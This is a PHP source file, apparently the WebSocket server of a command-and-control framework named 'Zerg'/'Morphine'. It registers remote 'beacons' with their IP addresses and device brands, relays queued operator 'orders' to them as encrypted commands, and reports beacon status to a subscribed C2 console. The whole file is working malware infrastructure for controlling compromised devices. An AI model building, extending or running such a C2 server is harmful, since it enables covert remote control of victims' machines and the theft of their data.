<?php

namespace Morphine\Engine\WebSocketServer;

require __DIR__ . '/vendor/autoload.php';
require __DIR__ . '/../database/Database.php';
require __DIR__ . '/../../../../application/models/Notifications.php';
require __DIR__ . '/libZergSocket.php';

use Ratchet\MessageComponentInterface;
use Ratchet\ConnectionInterface;
use Ratchet\Http\HttpServer;
use Ratchet\Server\IoServer;
use Ratchet\WebSocket\WsServer;
use React\EventLoop\Factory as LoopFactory;
use React\Socket\Server as ReactServer;
use Zerg\Models\Notifications;

class WebSocket implements MessageComponentInterface
{
    public $clients;
    public array $live_sigs;
    public $C2_information_slot;
    protected $dbConnection;
    private $libZergSocket;

    public function __construct()
    {
        $this->clients = new \SplObjectStorage;
        $this->C2_information_slot = false;
        $this->dbConnection = new \Morphine\Engine\Database();
        $this->libZergSocket = new \libZergSocket($this->dbConnection);
        $this->live_sigs = [];

        // reset all Beacons to disconnected
        $this->resetBeacons();
    }

    public function onOpen(ConnectionInterface $conn)
    {
        echo "New connection! ({$conn->resourceId})\n";
        $this->clients->attach($conn);
    }

    public function onMessage(ConnectionInterface $from, $msg)
    {
        if ($msg == "ZController_Check") {
            // check for pending commands
            $this->processDatabaseCommands();
        } else if ($msg == 'C2_information_subscribe::20210801') {
            // subscribe C2 information slots
            $this->C2_information_slot = new \SplObjectStorage;
            $this->C2_information_slot->attach($from);
            echo "\nSubscribed a C2 handler !\n";
        } else {
            if (is_string($msg) && $msg != '') {
                echo "Received binary message: $msg\n";
                $msg = $this->libZergSocket->decryptMessage($msg, $from, $this);
                if ($msg) {
                    echo "\n\n" . $msg . "\n\n";
                    $this->libZergSocket->handleBeaconMessage($msg, $from, $this);
                }
            }
        }
    }

    public function onClose(ConnectionInterface $conn)
    {
        echo "Connection {$conn->resourceId} has disconnected\n";
        $this->unsubscribe($conn->resourceId);
        $this->clients->detach($conn);
    }

    public function onError(ConnectionInterface $conn, \Exception $e)
    {
        echo "An error has occurred: {$e->getMessage()}\n";
        $conn->close();
    }


    private function processDatabaseCommands()
    {
        $this->refresh_connected_beacons();
        $this->check_status();
        $where = array(
            'status' => 'pending'
        );
        $this->dbConnection->select('*', 'orders', $where);

        $total = $this->dbConnection->getTotalRows();
        if ($total > 0) {
            while ($row = $this->dbConnection->exists()) {
                if ($this->isBeaconConnected($row['beacon'])) {
                    echo "target beacon " . $row['beacon'] . " connected";
                    foreach ($this->clients as $client) {
                        // Compare client's resourceId with command's beacon
                        if ($row['beacon'] == $this->getSigById($client->resourceId)) {
                            if ($this->libZergSocket->ordered_beacon($row['id']) === $this->getSigById($client->resourceId)) {
                                // Send command to the client
                                $client->send(
                                    $this->libZergSocket->encryptAES(
                                        json_encode(['type' => $row['type'], 'data' => $row['content'], 'cid' => $row['id']]),
                                        $this->libZergSocket->encryption_key($row['beacon'])
                                    ));
                                $this->orderChecked($row['id']);
                                echo "\nCommand found and sent to: " . $client->resourceId . "\n";
                            }
                        }
                    }
                }
            }
        }
        $this->C2_information();
    }

    public function getSigById($temp_id)
    {
        $where = array(
            'tmp_id' => $temp_id
        );
        $this->dbConnection->select('*', 'clients', $where);
        $total = $this->dbConnection->getTotalRows();
        if ($total > 0) {
            while ($row = $this->dbConnection->exists()) {
                return $row['beacon_signature'];
            }
        }
        return "";
    }

    public function isBeaconConnected($beacon_signature)
    {
        $where = array(
            'beacon_signature' => $beacon_signature
        );
        $this->dbConnection->select('*', 'clients', $where);
        $total = $this->dbConnection->getTotalRows();
        if ($total > 0) {
            while ($row = $this->dbConnection->exists()) {
                if ($row['is_connected'] == 1) {
                    return true;
                }
            }
        }
        return false;
    }

    public function refresh_connected_beacons()
    {
        foreach ($this->live_sigs as $sig) {
            $where = array(
                'beacon_signature' => $sig
            );
            $this->dbConnection->select('*', 'clients', $where);
            $total = $this->dbConnection->getTotalRows();
            if ($total > 0) {
                while ($row = $this->dbConnection->exists()) {
                    $exists = false;
                    $tmp_id = $row['tmp_id'];
                    // check if client->resourceId is connected
                    foreach ($this->clients as $client)
                    {
                        if($client->resourceId == $tmp_id)
                        {
                            $exists = true;
                        }
                    }

                    if($exists == false)
                    {
                        // disconnect beacon
                        $this->unsubscribe($tmp_id);
                    }
                }
            }
        }
    }

    // Add comments to explain the purpose of the method
    private function orderChecked($order_id) {
        $data = array(
            'table' => 'orders',
            'setColumn' => array(
                'status'
            ),
            'setValue' => array(
                'checked'
            ),
            'where' => array(
                'id' => $order_id
            )
        );
        $this->dbConnection->update($data);
        $data = array(
            'table' => 'orders',
            'setColumn' => array(
                'checked_time'
            ),
            'setValue' => array(
                time()
            ),
            'where' => array(
                'id' => $order_id
            )
        );
        $this->dbConnection->update($data);

        $where = array(
            'id' => $order_id
        );
        $this->dbConnection->select('*', 'orders', $where);
        $total = $this->dbConnection->getTotalRows();
        if ($total > 0) {
            while ($row = $this->dbConnection->exists()) {
                $this->send_to_c2(['data' => 'checked_order', 'checked_order_id' => $order_id, 'checked_order_type' => $row['type'], 'checked_order_beacon' => $row['beacon']]);
                echo "sent data to C2\n";
            }
        }
    }

    private function send_to_c2($data)
    {
        if($this->C2_information_slot) {
            foreach ($this->C2_information_slot as $c2)
            {
                echo "C2 => " . $c2->resourceId;
                $c2->send(json_encode(
                    $data
                ));
            }
        }
    }
    public function subscribe($temp_id, $signature, $ip)
    {
        echo "entered subscribe function \n";
        $where = array(
            'beacon_signature' => $signature
        );
        $this->dbConnection->select('*', 'clients', $where);

        $total = $this->dbConnection->getTotalRows();

        if ($total > 0){
            // Beacon already exists, update the status
            $data = array(
                'table' => 'clients',
                'setColumn' => array(
                    'is_connected'
                ),
                'setValue' => array(
                    1
                ),
                'where' => array(
                    'beacon_signature' => $signature
                )
            );
            $this->dbConnection->update($data);
            $data = array(
                'table' => 'clients',
                'setColumn' => array(
                    'tmp_id'
                ),
                'setValue' => array(
                    $temp_id
                ),
                'where' => array(
                    'beacon_signature' => $signature
                )
            );
            $this->dbConnection->update($data);
            $data = array(
                'table' => 'clients',
                'setColumn' => array(
                    'connect_time'
                ),
                'setValue' => array(
                    time()
                ),
                'where' => array(
                    'beacon_signature' => $signature
                )
            );
            $this->dbConnection->update($data);
            $data = array(
                'table' => 'clients',
                'setColumn' => array(
                    'ip_address'
                ),
                'setValue' => array(
                    $ip
                ),
                'where' => array(
                    'beacon_signature' => $signature
                )
            );
            $this->dbConnection->update($data);

        }
        else
        {
            // Beacon is new to the list, subscribe it
            $data = array(
                'table' => 'clients',
                $temp_id => 'tmp_id',
                $signature => 'beacon_signature',
                1 => 'is_connected',
                time() => 'connect_time'
            );
            $this->dbConnection->insert($data);
        }
    }

    private function unsubscribe($temp_id)
    {
        $data = array(
            'table' => 'clients',
            'setColumn' => array(
                'is_connected'
            ),
            'setValue' => array(
                0
            ),
            'where' => array(
                'tmp_id' => $temp_id
            )
        );
        $this->dbConnection->update($data);
        $data = array(
            'table' => 'clients',
            'setColumn' => array(
                'signaled_connection'
            ),
            'setValue' => array(
                0
            ),
            'where' => array(
                'tmp_id' => $temp_id
            )
        );
        $this->dbConnection->update($data);
        $data = array(
            'table' => 'clients',
            'setColumn' => array(
                'disconnect_time'
            ),
            'setValue' => array(
                time()
            ),
            'where' => array(
                'tmp_id' => $temp_id
            )
        );
        $this->dbConnection->update($data);

        $this->removeFromLiveSigs($this->live_sigs, $this->getSigById($temp_id));
    }

    function removeFromLiveSigs(&$array, $sig) {
        $index = array_search($sig, $array);
        if ($index !== false) {
            unset($array[$index]);
            // Re-index the array to maintain numerical index order
            $array = array_values($array);
        }
    }

    private function resetBeacons()
    {
        $where = array(
            'is_connected' => 1
        );
        $this->dbConnection->select('*', 'clients', $where);
        $total = $this->dbConnection->getTotalRows();
        if ($total > 0) {
            while ($row = $this->dbConnection->exists())
            {
                $data = array(
                    'table' => 'clients',
                    'setColumn' => array(
                        'is_connected'
                    ),
                    'setValue' => array(
                        0
                    ),
                    'where' => array(
                        'id' => $row['id']
                    )
                );
                $this->dbConnection->update($data);
                $data = array(
                    'table' => 'clients',
                    'setColumn' => array(
                        'disconnect_time'
                    ),
                    'setValue' => array(
                        time()
                    ),
                    'where' => array(
                        'id' => $row['id']
                    )
                );
                $this->dbConnection->update($data);
                $data = array(
                    'table' => 'clients',
                    'setColumn' => array(
                        'signaled_connection'
                    ),
                    'setValue' => array(
                        0
                    ),
                    'where' => array(
                        'id' => $row['id']
                    )
                );
                $this->dbConnection->update($data);
            }
        }
    }

    public function check_status()
    {
        $this->dbConnection->select('*', 'clients');
        $total = $this->dbConnection->getTotalRows();
        if ($total > 0) {
            while ($row = $this->dbConnection->exists())
            {
                $connected = 0;
                foreach ($this->live_sigs as $sig) {
                    if($sig == $row['beacon_signature'])
                    {
                        $data = array(
                            'table' => 'clients',
                            'setColumn' => array(
                                'is_connected'
                            ),
                            'setValue' => array(
                                1
                            ),
                            'where' => array(
                                'id' => $row['id']
                            )
                        );
                        $this->dbConnection->update($data);
                        $connected = 1;
                    }
                }
                if($connected == 0)
                {
                    $data = array(
                        'table' => 'clients',
                        'setColumn' => array(
                            'is_connected'
                        ),
                        'setValue' => array(
                            0
                        ),
                        'where' => array(
                            'id' => $row['id']
                        )
                    );
                    $this->dbConnection->update($data);
                    $data = array(
                        'table' => 'clients',
                        'setColumn' => array(
                            'signaled_connection'
                        ),
                        'setValue' => array(
                            0
                        ),
                        'where' => array(
                            'id' => $row['id']
                        )
                    );
                    $this->dbConnection->update($data);
                }
            }
        }
    }

    public function C2_information()
    {
        if($this->C2_information_slot) {
            //echo print_r($this->C2_information_slot, true);
            $data = $this->C2_information_helper();
            foreach ($this->C2_information_slot as $c2)
            {
                $c2->send(json_encode(
                    [
                        'a_beacons' => $data['active_stream_beacons'],
                        'c_beacons' => $data['connected_beacons_count'],
                        'd_beacons' => $data['offline_beacons_count'],
                        'c_beacons_checksum' => $data['online_beacons_checksum'],
                        'd_beacons_checksum' => $data['offline_beacons_checksum'],
                        'push' => json_encode($data['push_notifications']),
                        'uplink' => 23
                    ]
                ));
            }
        }
    }

    public function C2_information_helper():array
    {
        // pre-definitions:
        $total_connected = 0;
        $total_offline = 0;
        $online_beacons = [];
        $offline_beacons = [];

        $where = array(
            'is_connected' => 1
        );
        $this->dbConnection->select('*', 'clients', $where);
        $total_connected = $this->dbConnection->getTotalRows();
        if ($total_connected > 0) {
            while ($row = $this->dbConnection->exists())
            {
                $online_beacons[]['ip_address'] = $row['ip_address'];
                $online_beacons[]['brand'] = $row['brand'];
                $online_beacons[]['connect_time'] = $row['connect_time'];
            }
        }

        $where = array(
            'is_connected' => 0
        );
        $this->dbConnection->select('*', 'clients', $where);
        $total_offline = $this->dbConnection->getTotalRows();
        if ($total_offline > 0) {
            while ($row = $this->dbConnection->exists())
            {
                $offline_beacons[]['brand'] = $row['brand'];
                $offline_beacons[]['disconnect_time'] = $row['disconnect_time'];
                $offline_beacons[]['ip_address'] = $row['ip_address'];
            }
        }

        #check Push Notification Signals
        $notifications_model = new Notifications($this->dbConnection);
        // Check first for pinned notifications, if it doesn't exist, then send the signal
        // if it exists, neutralize the signal
        $is_there_pinned = $notifications_model->get_pushable_notifications();
        if(count($is_there_pinned) == 0)
        {
            $push = [ $notifications_model->signal_connected_beacon() ]; # Keep it an array for compatibility
            # Always clean push notifications "a.k.a mark them as delivered" to avoid overriding ongoing pinned notifications
            # On next ZergController call.
        }
        # The above is a hotfix for conflicting push notifications, unimportant notifications were overriding
        # important once, because they collide in the same timespan .
        return [
            'connected_beacons_count' => $total_connected,
            'offline_beacons_count' => $total_offline,
            'online_beacons_checksum' => sha1(json_encode($online_beacons)),
            'offline_beacons_checksum' => sha1(json_encode($offline_beacons)),
            'active_stream_beacons' => 0,
            'push_notifications' => $push??$is_there_pinned??[]
            ];
    }

    private function get_last_beacon_id()
    {
        $this->dbConnection->select('*', 'clients');
        $total_connected = $this->dbConnection->getTotalRows();
        if ($total_connected > 0) {
            while ($row = $this->dbConnection->exists())
            {
                return $row['id'];
            }
        }
    }

    public function validateBeaconConfig($beacon_sig, $type, $cid)
    {
        $pending_config = '';
        $where = array(
            'id' => $cid
        );
        $this->dbConnection->select('*', 'orders', $where);
        $total_config_rows = $this->dbConnection->getTotalRows();

        if ($total_config_rows > 0) {
            while ($row = $this->dbConnection->exists())
            {
                $pending_config =  $row['content'];
            }
        }

        $data = array(
            'table' => 'beacon_configs',
            'setColumn' => array(
                'config_json'
            ),
            'setValue' => array(
                $pending_config
            ),
            'where' => array(
                'config_type' => $type,
                'beacon_sig' => $beacon_sig
            )
        );
        $this->dbConnection->update($data);
    }

    function fulfillOrder($cid)
    {
        $data = array(
            'table' => 'orders',
            'setColumn' => array(
                'status'
            ),
            'setValue' => array(
                'fulfilled'
            ),
            'where' => array(
                'id' => $cid
            )
        );
        $this->dbConnection->update($data);
    }

}